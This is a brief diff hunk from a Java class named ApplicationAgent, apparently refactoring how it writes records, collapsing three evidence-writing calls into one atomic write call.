@@ -151,9 +151,7 @@ public final class ApplicationAgent extends Agent implements
         items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
-        evidence.createEvidence(null);
-        evidence.writeEvidences(items);
-        evidence.close();
+        evidence.atomicWriteOnce(items);
 
     }
 
